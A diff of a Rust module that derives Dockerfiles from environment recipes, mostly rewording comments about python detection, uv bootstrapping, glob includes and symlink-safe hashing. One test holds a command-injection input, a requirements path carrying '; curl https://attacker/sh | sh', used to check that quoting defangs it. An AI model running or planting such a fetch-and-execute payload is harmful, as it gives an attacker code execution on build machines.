@@ -313,15 +313,13 @@ fn validate_token(field: &str, value: &str) -> Result<(), DeriveError> {
 /// in, and `rlmesh_package` is the resolved pip-spec-or-staged-wheel install ref.
 /// Passing them in (rather than re-reading `recipe.build.base` / hardcoding
 /// `pip install rlmesh`) keeps the Dockerfile in agreement with the build hash.
-/// `packages` are the extra caller-supplied pip packages (the `packages=[...]`
-/// argument to `SandboxEnv`).
+/// `packages` are the extra caller-supplied pip packages from `SandboxEnv`.
 ///
 /// `provenance` gates the implicit unpinned `gymnasium` install: an `Installed`
-/// recipe gets it for free (the convenience the gym/hf paths also bake in), but
-/// a `Remote` recipe (forced fully-pinned + digest-pinned by the upstream
-/// reproducibility gate) must NOT receive a mutable PyPI resolve, so the
-/// implicit `gymnasium` is skipped -- a `Remote` recipe that needs gymnasium
-/// declares a pinned `gymnasium==X` in `build.pip` itself.
+/// recipe gets it for free (the convenience the gym/hf paths also bake in).
+/// A `Remote` recipe is fully pinned and digest pinned upstream, so it must not
+/// receive a mutable PyPI resolve. A remote recipe that needs gymnasium declares
+/// a pinned `gymnasium==X` in `build.pip`.
 ///
 /// Ordering: `FROM` -> `ENV` -> `WORKDIR` -> `COPY packages` -> apt (system
 /// packages) -> build-time python detection (a non-`python` base self-installs
@@ -370,7 +368,7 @@ pub(crate) fn derive_dockerfile(
     let verb = install_verb(&build.installer);
 
     // `base_image` already folds in the `build.base`-wins-else-caller-override
-    // precedence (resolved upstream and hashed); do NOT re-read `build.base`.
+    // precedence (resolved upstream and hashed); do not re-read `build.base`.
     let base = base_image;
     validate_token("build.base", base)?;
 
@@ -420,14 +418,14 @@ pub(crate) fn derive_dockerfile(
     }
     out.push_str(&render_system_packages(&apt)?);
 
-    // A base whose NAME lacks "python" might be a bare CUDA base (no interpreter)
-    // OR a python-capable image whose tag just does not say so (e.g.
-    // `nvcr.io/nvidia/pytorch:...-py3`, `nvidia/isaac-lab:...`). DETECT python at
-    // BUILD time instead of installing unconditionally: these RUNs no-op on an
+    // A base whose name lacks "python" might be a bare CUDA base with no
+    // interpreter or a python-capable image whose tag just does not say so (for
+    // example, `nvcr.io/nvidia/pytorch:*-py3` or `nvidia/isaac-lab:*`). Detect
+    // python at build time instead of installing unconditionally: these RUNs no-op on an
     // image that already ships python3/python (so the image's own interpreter and
     // preinstalled packages are left untouched) and install/symlink only on a
     // bare base. Emitted after apt and before the uv bootstrap / project / fetch /
-    // pip chain so `python -m pip ...` resolves from here on.
+    // pip chain so `python -m pip install` resolves from here on.
     if base_is_non_python(base) {
         out.push_str(
             "RUN command -v python3 >/dev/null 2>&1 || (apt-get update && apt-get install -y --no-install-recommends python3 python3-pip && rm -rf /var/lib/apt/lists/*)\n",
@@ -437,11 +435,11 @@ pub(crate) fn derive_dockerfile(
         );
     }
 
-    // installer=="uv": bootstrap uv with pip BEFORE any `uv pip install` runs.
-    // `render_project` / `render_fetch` use the install verb (`uv pip install
-    // ...` here), but `render_pip_chain` is where uv would otherwise be installed
-    // -- after them -- so a project or a pip-installing fetch would hit `uv: not
-    // found`. Emit the bootstrap early; render_pip_chain then starts at the rlmesh
+    // installer=="uv": bootstrap uv with pip before any `uv pip install` runs.
+    // `render_project` / `render_fetch` use `uv pip install`, but `render_pip_chain`
+    // is where uv would otherwise be installed afterward, so a project or a
+    // pip-installing fetch would hit `uv: not found`. Emit the bootstrap early;
+    // render_pip_chain then starts at the rlmesh
     // install for uv (the pip path keeps bootstrapping pip inside its own RUN).
     if build.installer == "uv" {
         out.push_str("RUN python -m pip install --no-cache-dir uv\n\n");
@@ -495,8 +493,8 @@ pub(crate) fn derive_dockerfile(
 
 /// A cheap "this base definitely ships python" fast-path: an image whose name
 /// contains "python" (e.g. `python:3.11-slim`) surely has an interpreter, so the
-/// deriver emits nothing extra. A `false` result is NOT a verdict that python is
-/// absent -- it only means we cannot tell from the name (a bare CUDA base has no
+/// deriver emits nothing extra. A `false` result is not a verdict that python is
+/// absent; it only means we cannot tell from the name (a bare CUDA base has no
 /// python, but a pytorch/isaac image does despite a name that lacks "python"), so
 /// the caller emits build-time `command -v` detection rather than installing
 /// unconditionally.
@@ -697,7 +695,7 @@ fn render_pip_chain(
     for step in steps {
         parts.push(render_pip_step(step, verb)?);
     }
-    // The caller's extra `packages` (the `packages=[...]` argument to SandboxEnv)
+    // The caller's extra `packages` from SandboxEnv
     // install last, in their own line, mirroring the gym/hf path in docker.rs.
     if !packages.is_empty() {
         let mut line = verb.to_string();
@@ -778,7 +776,7 @@ pub struct IncludeMatch {
 /// the *same* entries in the *same* order.
 ///
 /// Globs resolve against `project_root` (`context_root.join(project.src)`). The
-/// path-traversal GUARD root is `context_root`: every match's *real* path
+/// path-traversal guard root is `context_root`: every match's *real* path
 /// (symlinks resolved) must stay within the real `context_root`, so a pattern
 /// may use `..` to reach a sibling above `src` (e.g. `../assets/**`, the shape
 /// the Python schema documents) but cannot escape the build context. Anything
@@ -790,8 +788,8 @@ pub struct IncludeMatch {
 /// dir rather than climbing out of it). For the common `src == "."` case the two
 /// coincide.
 ///
-/// SUPPORTED GLOB SUBSET (documented, intentionally minimal -- no `glob` crate
-/// dependency): each pattern is `/`-split into segments matched against the tree
+/// Supported glob subset (documented, intentionally minimal, with no `glob`
+/// crate dependency): each pattern is `/`-split into segments matched against the tree
 /// segment-by-segment. A segment may be a literal, contain `*` (matches any run
 /// of non-`/` characters within a single path segment), or be exactly `**`
 /// (matches zero or more whole path segments). So `assets/**`, `*.json`,
@@ -878,8 +876,8 @@ pub(crate) fn recipe_content_digest(
 
     // Fold in each `include` glob match too, keyed by its staged layout, so
     // editing an included asset rebuilds the image. resolve_includes returns the
-    // SAME entries copy_tree stages, in the same sorted order, so the digest
-    // tracks exactly the bytes that ship.
+    // resolve_includes returns the same entries copy_tree stages, in the same
+    // sorted order, so the digest tracks exactly the bytes that ship.
     let includes = resolve_includes(&src, root, &project.include)
         .with_context(|| format!("failed to resolve project includes under {}", src.display()))?;
     for include in includes {
@@ -893,18 +891,18 @@ pub(crate) fn recipe_content_digest(
     Ok(Some(hex(&hasher.finalize())))
 }
 
-/// Hash a file or directory tree deterministically: for each file (in sorted
-/// relative-path order) the relative path and its bytes are folded in, so the
-/// digest tracks content, not just paths (mirrors Docker's COPY-layer cache key).
+/// Hash a file or directory tree deterministically. For each file in sorted
+/// relative-path order, the relative path and bytes are folded in so the digest
+/// mirrors Docker's COPY-layer cache key.
 ///
-/// Symlinks WITHIN the tree are SKIPPED, for safety and consistency: each child
-/// is classified by its own `entry.file_type()` (which reports the LINK itself,
-/// never dereferencing or erroring on a dangling/looping target) and a symlink
+/// Symlink children are skipped for safety and consistency. Each child is
+/// classified by its own `entry.file_type()`, which reports the link itself
+/// without dereferencing or erroring on a dangling/looping target. A symlink
 /// child is dropped before it is sorted, hashed, or recursed into. `copy_tree`
-/// in docker.rs makes the identical skip decision so the *exact* set of bytes
-/// this hashes matches the set staged into the image. `fs::metadata` is used
-/// ONLY to classify the passed-in root; every CHILD is filtered first, so it
-/// never runs on a link and cannot abort on a cycle or a dangling target.
+/// in docker.rs makes the same skip decision, so the hashed bytes match the
+/// bytes staged into the image. `fs::metadata` is used only to classify the
+/// passed-in root; every child is filtered first, so it never runs on a link and
+/// cannot abort on a cycle or a dangling target.
 /// Linked/out-of-tree assets are carried explicitly via `ProjectInstall::include`
 /// (a guarded, canonicalized glob), not by silently following links here.
 fn hash_path_tree(root: &Path, path: &Path, hasher: &mut Sha256) -> AnyResult<()> {
@@ -965,9 +963,9 @@ fn match_glob(
             match_glob(&parent, rest, pattern, real_context, out)
         }
         "**" => {
-            // `**` matches zero segments (try `rest` here) ...
+            // `**` matches zero segments; try `rest` here first.
             match_glob(current, rest, pattern, real_context, out)?;
-            // ... or one-or-more: descend into each child dir and re-apply `**`.
+            // Or match one-or-more segments by descending into each child dir.
             for child in read_child_dirs(current, pattern)? {
                 match_glob(&child, segments, pattern, real_context, out)?;
             }
@@ -1009,17 +1007,16 @@ fn read_entries(dir: &Path, pattern: &str) -> Result<Vec<std::fs::DirEntry>, Inc
         .collect()
 }
 
-/// List the immediate child *directories* of `dir` for the `**` descent,
-/// SKIPPING symlinked entries.
+/// List the immediate child directories of `dir` for the `**` descent, skipping
+/// symlinked entries.
 ///
-/// Classification uses the `DirEntry`'s own file type (the LINK itself, never
-/// dereferenced), so `**` descends only into REAL directories: a benign outward
-/// symlink (e.g. `.venv -> /shared`) is not followed into `guarded()` -- where it
-/// would hard-fail as `Escapes` -- and a cyclic link cannot trigger a
-/// `FilesystemLoop`. A directly-NAMED (literal) include path that is a symlink
-/// still flows through the terminal `guarded()` containment check and is staged
-/// if it resolves within `context_root`; only the auto-descent of `**` stops
-/// following links.
+/// Classification uses the `DirEntry`'s own file type, so `**` descends only
+/// into real directories. A benign outward symlink (e.g. `.venv -> /shared`) is
+/// not followed into `guarded()`, where it would fail as `Escapes`, and a cyclic
+/// link cannot trigger a `FilesystemLoop`. A directly named literal include path
+/// that is a symlink still flows through the terminal `guarded()` containment
+/// check and is staged if it resolves within `context_root`; only the
+/// auto-descent of `**` stops following links.
 fn read_child_dirs(dir: &Path, pattern: &str) -> Result<Vec<PathBuf>, IncludeError> {
     let mut dirs = Vec::new();
     for entry in read_entries(dir, pattern)? {
@@ -1291,13 +1288,13 @@ mod tests {
         )
         .expect("parses");
         let derived = derive(&recipe).expect("derives");
-        // The path is emitted as a single quoted argument; the injected metachars
-        // stay INSIDE the quotes (defanged), so no bare `; ` / `| ` survives.
+        // The path is emitted as a single quoted argument. The injected metachars
+        // stay inside the quotes, so no bare `; ` / `| ` survives.
         assert!(derived.contains(" -r '/opt/r/requirements.txt; curl https://attacker/sh | sh'"));
-        // The OLD unquoted form (dest_q then a bare /req) must NOT appear: that
+        // The old unquoted form (dest_q then a bare /req) must not appear; that
         // left the metacharacters outside the quotes as live shell syntax.
         assert!(!derived.contains(" -r '/opt/r'/requirements.txt"));
-        // The injected `; curl ... | sh` lives only inside the single-quoted
+        // The injected shell fragment lives only inside the single-quoted
         // path argument, so the shell never parses it as a command separator.
         // This fetch is unpinned (no ref), so the chain uses `git clone`.
         let run_line = derived
@@ -1343,7 +1340,7 @@ mod tests {
 
     #[test]
     fn derive_dockerfile_does_not_duplicate_an_already_listed_tool() {
-        // The author already lists git; the deriver must NOT add a second 'git'.
+        // The author already lists git; the deriver must not add a second 'git'.
         let recipe = Recipe::from_json(
             r#"{"name":"a","build":{"system":["git","cmake"],"fetch":[{"kind":"git","repo":"https://x/r.git","dest":"/opt/r"}]}}"#,
         )
@@ -1390,8 +1387,8 @@ mod tests {
 
     #[test]
     fn uv_is_bootstrapped_before_a_project_uv_install() {
-        // installer="uv" + a project: render_project emits `uv pip install -e ...`,
-        // but uv is bootstrapped (`python -m pip install ... uv`) in render_pip_chain
+        // installer="uv" + a project: render_project emits a uv editable install,
+        // but uv is bootstrapped (`python -m pip install uv`) in render_pip_chain
         // which runs AFTER the project -- so without an early bootstrap the build
         // hits `uv: not found`. The early bootstrap must precede the first project
         // `uv pip install`.
@@ -1436,7 +1433,7 @@ mod tests {
     #[test]
     fn remote_provenance_skips_implicit_unpinned_gymnasium() {
         // A Remote recipe is forced fully-pinned by the upstream reproducibility
-        // gate, so the deriver must NOT inject an implicit unpinned gymnasium
+        // gate, so the deriver must not inject an implicit unpinned gymnasium
         // (that would resolve a mutable PyPI package, bypassing the gate). An
         // Installed recipe still gets it as a convenience.
         let recipe = Recipe::from_json(r#"{"name":"a"}"#).expect("parses");
@@ -1486,7 +1483,7 @@ mod tests {
             RecipeProvenance::Installed,
         )
         .expect("derives");
-        // Both steps are CONDITIONAL: they install/symlink only when python is
+        // Both steps are conditional: they install/symlink only when python is
         // absent, so a python-capable image is left untouched.
         assert!(derived.contains(
             "RUN command -v python3 >/dev/null 2>&1 || (apt-get update && apt-get install -y --no-install-recommends python3 python3-pip && rm -rf /var/lib/apt/lists/*)"
@@ -1494,9 +1491,9 @@ mod tests {
         assert!(derived.contains(
             "RUN command -v python >/dev/null 2>&1 || ln -sf \"$(command -v python3)\" /usr/local/bin/python"
         ));
-        // python3 / python3-pip must NOT be force-added to the unconditional apt
+        // python3 / python3-pip must not be force-added to the unconditional apt
         // install line (that is the clobbering behavior we removed); they appear
-        // only inside the guarded `command -v ... ||` RUN.
+        // only inside the guarded `command -v python3 ||` RUN.
         if let Some(apt_line) = derived
             .lines()
             .find(|line| line.starts_with("RUN apt-get update && apt-get install"))
@@ -1511,7 +1508,7 @@ mod tests {
         let pip = derived.find("-m pip install").expect("pip layer");
         assert!(detect < pip, "python detect must precede the pip layer");
 
-        // The default python base must NOT get either conditional RUN.
+        // The default python base must not get either conditional RUN.
         let py = Recipe::from_json(r#"{"name":"a","make":{"kind":"gym","env_id":"E-v0"}}"#)
             .expect("parses");
         let py_derived = derive(&py).expect("derives");
@@ -1521,10 +1518,10 @@ mod tests {
 
     #[test]
     fn pytorch_base_self_detects_python_instead_of_clobbering() {
-        // `nvcr.io/nvidia/pytorch:24.01-py3` ships its own python, but its NAME
+        // `nvcr.io/nvidia/pytorch:24.01-py3` ships its own python, but its name
         // contains no literal "python" ('pytorch' is not 'python'), so the deriver
-        // cannot tell from the tag. It must emit the CONDITIONAL detect form (which
-        // no-ops on the preinstalled interpreter), NOT an unconditional apt install
+        // cannot tell from the tag. It must emit the conditional detect form, which
+        // no-ops on the preinstalled interpreter, not an unconditional apt install
         // that would clobber the image's python and hide its packages.
         let recipe = Recipe::from_json(r#"{"name":"a"}"#).expect("parses");
         let derived = derive_dockerfile(
@@ -1535,14 +1532,14 @@ mod tests {
             RecipeProvenance::Installed,
         )
         .expect("derives");
-        // The guarded detect/symlink (a no-op when python is present) is emitted...
+        // The guarded detect/symlink is emitted; it no-ops when python is present.
         assert!(derived.contains(
             "RUN command -v python3 >/dev/null 2>&1 || (apt-get update && apt-get install -y --no-install-recommends python3 python3-pip && rm -rf /var/lib/apt/lists/*)"
         ));
         assert!(derived.contains(
             "RUN command -v python >/dev/null 2>&1 || ln -sf \"$(command -v python3)\" /usr/local/bin/python"
         ));
-        // ...and there is NO unconditional apt install of python3 that would
+        // There is no unconditional apt install of python3 that would
         // clobber the image's interpreter.
         assert!(
             !derived.lines().any(
@@ -1617,7 +1614,7 @@ mod tests {
 
     #[test]
     fn appends_caller_extra_packages_to_pip_chain() {
-        // The packages=[...] argument to SandboxEnv must reach the pip chain.
+        // The SandboxEnv packages argument must reach the pip chain.
         let recipe = Recipe::from_json(r#"{"name":"a"}"#).expect("parses");
         let packages = vec!["pygame".to_string(), "numpy==1.26.4".to_string()];
         let derived = derive_dockerfile(
@@ -1727,9 +1724,9 @@ mod tests {
         let root = dir.path();
         write(&root.join("real/a.txt"), b"a");
         // A benign outward symlink (whose target holds a `.txt` that would be
-        // matched -- and rejected as Escapes -- if `**` descended through it) ...
+        // matched and rejected as Escapes if `**` descended through it).
         std::os::unix::fs::symlink(outer.path(), root.join("venv")).unwrap();
-        // ... and a directory self-link (a FilesystemLoop if descended).
+        // Add a directory self-link too; it would trigger FilesystemLoop if descended.
         std::os::unix::fs::symlink(".", root.join("loop")).unwrap();
 
         // src == "." so project_root == context_root; `**/*.txt` descends into
@@ -1766,11 +1763,11 @@ mod tests {
     #[cfg(unix)]
     #[test]
     fn content_digest_skips_symlinks_and_is_stable_under_cycle_or_dangling() {
-        // hash_path_tree and copy_tree make the IDENTICAL skip decision: a
+        // hash_path_tree and copy_tree make the same skip decision: a
         // symlink within the tree is not hashed (so it never leaks out-of-tree
         // bytes into the digest), and a cyclic/dangling link does not abort the
-        // hash. Editing a symlink TARGET reachable only through the link leaves
-        // the digest unchanged -- such assets must be carried via `include`, not
+        // hash. Editing a symlink target reachable only through the link leaves
+        // the digest unchanged; such assets must be carried via `include`, not
         // by silently following links.
         let target_root = tempfile::tempdir().unwrap();
         let real = target_root.path().join("real");
@@ -1797,8 +1794,8 @@ mod tests {
         let first = recipe_content_digest(Some(&recipe), Some(src_dir.path()))
             .unwrap()
             .unwrap();
-        // Editing the symlink TARGET must NOT change the digest: the link entry
-        // is skipped, exactly as copy_tree skips staging it.
+        // Editing the symlink target must not change the digest: the link entry
+        // is skipped, matching copy_tree's staging behavior.
         std::fs::write(real.join("data.bin"), b"v2-longer").unwrap();
         let second = recipe_content_digest(Some(&recipe), Some(src_dir.path()))
             .unwrap()
@@ -1811,10 +1808,10 @@ mod tests {
 
     #[test]
     fn content_digest_tracks_include_glob_assets_above_src() {
-        // An `include`d asset ABOVE src (a sibling not carried by the src-tree
+        // An `include`d asset above src (a sibling not carried by the src-tree
         // copy/hash) must still be folded into the digest, so editing it rebuilds
         // the image. Using an above-src asset isolates the include logic: the
-        // src-tree hash alone would NOT cover it.
+        // src-tree hash alone would not cover it.
         let dir = tempfile::tempdir().unwrap();
         let context_root = dir.path();
         std::fs::create_dir_all(context_root.join("pkg")).unwrap();
